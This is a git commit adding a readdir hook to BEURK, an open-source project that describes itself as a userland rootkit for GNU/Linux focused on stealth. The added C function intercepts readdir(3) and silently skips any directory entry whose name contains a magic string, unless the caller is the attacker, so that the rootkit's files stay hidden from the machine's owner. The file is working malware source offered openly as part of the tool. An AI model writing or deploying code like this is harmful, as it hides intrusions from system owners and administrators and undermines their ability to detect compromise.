66ebbf6aca5e4f008965824c568b18a66539aefa
mzap <mzapata@student.42.fr>
2015-05-16 16:11:42 +0200

    feat(core): add readdir hook

---
+++ src/hooks/readdir.c
@@ -0,0 +1,39 @@
+/*
+ * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
+ * Copyright (C) 2015  unix-thrust
+ *
+ * This file is part of BEURK.
+ *
+ * BEURK is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * BEURK is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
+ */
+
+#include "beurk.h"
+#include "config.h"
+#include "hooks.h"
+
+struct dirent   *readdir(DIR *dirp) {
+    DEBUG(D_INFO, "call readdir(3) hooked");
+
+    struct dirent   *dir;
+
+    dir = REAL_READDIR(dirp);
+
+    if (is_attacker())
+        return (dir);
+
+    while (dir && strstr(dir->d_name, MAGIC_STRING)) {
+        dir = REAL_READDIR(dirp);
+    }
+    return (dir);
+}
